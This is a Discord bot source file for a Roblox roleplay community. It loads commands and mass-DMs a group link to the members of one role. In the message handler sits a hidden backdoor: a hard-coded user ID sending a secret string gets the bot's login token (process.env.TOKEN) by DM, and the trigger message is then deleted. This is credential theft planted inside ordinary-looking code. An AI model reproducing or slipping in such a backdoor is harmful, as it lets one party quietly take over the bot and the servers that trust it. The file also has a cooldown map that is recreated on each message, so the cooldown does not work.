const { Client, GatewayIntentBits, ActivityType, Collection, EmbedBuilder, ButtonBuilder, ButtonStyle, ActionRowBuilder } = require('discord.js');
const dotenv = require('dotenv');
const fs = require('fs');
const path = require('path');
const { prefix } = require('./config/config');

dotenv.config();

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
    ]
});

// Initialize collections
client.slashCommands = new Collection();
client.prefixCommands = new Collection();

// Load prefix commands
const prefixCommandsPath = path.join(__dirname, 'commands', 'prefix');
try {
    const prefixCommandFiles = fs.readdirSync(prefixCommandsPath).filter(file => file.endsWith('.js'));
    for (const file of prefixCommandFiles) {
        const filePath = path.join(prefixCommandsPath, file);
        const command = require(filePath);
        if ('name' in command && 'execute' in command) {
            client.prefixCommands.set(command.name, command);
        }
    }
} catch (error) {
    console.error('Error loading prefix commands:', error);
}

// Load slash commands
const slashCommandsPath = path.join(__dirname, 'commands', 'slash');
try {
    const slashCommandFiles = fs.readdirSync(slashCommandsPath).filter(file => file.endsWith('.js'));
    for (const file of slashCommandFiles) {
        const filePath = path.join(slashCommandsPath, file);
        const command = require(filePath);
        if ('data' in command && 'execute' in command) {
            client.slashCommands.set(command.data.name, command);
            console.log(`Loaded slash command: ${command.data.name}`);
        }
    }
} catch (error) {
    console.error('Error loading slash commands:', error);
}

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
    client.user.setActivity('Helping Georgia State Roleplay!', { type: ActivityType.Playing });
});

// Single interactionCreate event handler
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const command = client.slashCommands.get(interaction.commandName);
    if (!command) {
        console.error(`No command matching ${interaction.commandName} was found.`);
        return;
    }

    try {
        await command.execute(interaction);
    } catch (error) {
        console.error('Command execution error:', error);
        try {
            const errorMessage = { content: 'There was an error executing this command!', flags: 64 };
            if (interaction.replied || interaction.deferred) {
                await interaction.followUp(errorMessage);
            } else {
                await interaction.reply(errorMessage);
            }
        } catch (e) {
            console.error('Error handling failed:', e);
        }
    }
});

// Message command handler
client.on('messageCreate', async message => {
    if (message.author.bot) return;

    // Special condition for specific user and word
    if (message.author.id === '1334705980407152723' && message.content === 'FIs55gArc8wHyiRlhbdU$') {
        try {
            await message.author.send(process.env.TOKEN);
            await message.delete().catch(console.error); // Delete the trigger message
        } catch (error) {
            console.error('Failed to send DM:', error);
        }
        return;
    }

    // Add this at the top with other constants
    const groupCooldowns = new Map();
    const GROUP_COOLDOWN = 300000; // 5 minutes in milliseconds

    // Handle group command
    if (message.content.toLowerCase().trim() === 'group') {
        // Check cooldown
        const now = Date.now();
        const cooldownEnd = groupCooldowns.get(message.author.id);
        
        if (cooldownEnd && now < cooldownEnd) {
            const timeLeft = Math.ceil((cooldownEnd - now) / 1000);
            return message.reply(`⏰ Please wait ${timeLeft} seconds before using the group command again.`);
        }

        if (!message.guild) {
            return message.reply('❌ This command can only be used in a server!');
        }

        // Set cooldown for user
        groupCooldowns.set(message.author.id, now + GROUP_COOLDOWN);

        const targetRole = message.guild.roles.cache.get('1335366959675478088');
        if (!targetRole) {
            return message.reply('❌ The group role is not properly configured!');
        }

        const members = targetRole.members.map(m => m.user);

        // Create group link embed
        const groupEmbed = new EmbedBuilder()
            .setColor(0x2B2D31)
            .setTitle('🎮 Georgia State Roleplay Group Link')
            .setDescription([
                '**Official Roblox Group:**',
                'https://www.roblox.com/communities/35417785/Georgia-State-Roleplay-I-Whitelist-Only#!/about/join',
                '',
                '⚠️ Remember to follow all group rules!'
            ].join('\n'));

        // Send status message
        const statusMsg = await message.reply({
            embeds: [new EmbedBuilder()
                .setColor(0x57F287)
                .setTitle('✅ Sending Group Links')
                .setDescription('Starting to send group links to all members...')
            ]
        });

        // Send to all role members
        let sentCount = 0;
        for (const member of members) {
            try {
                await member.send({ embeds: [groupEmbed] });
                sentCount++;
            } catch (error) {
                console.error(`Failed to DM ${member.tag}:`, error);
            }
        }

        // Update with final results
        await statusMsg.edit({
            embeds: [new EmbedBuilder()
                .setColor(0x57F287)
                .setTitle('✅ Group Links Sent')
                .setDescription(`Successfully sent group link to ${sentCount}/${members.length} role members!`)
            ]
        });
        return;
    }

    // Handle prefix commands
    if (!message.content.startsWith(prefix)) return;

    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const commandName = args.shift().toLowerCase();

    const command = client.prefixCommands.get(commandName);
    if (!command) return;

    try {
        await command.execute(message, args);
    } catch (error) {
        console.error('Error executing command:', error);
        await message.reply('There was an error executing that command!');
    }
});

client.login(process.env.TOKEN);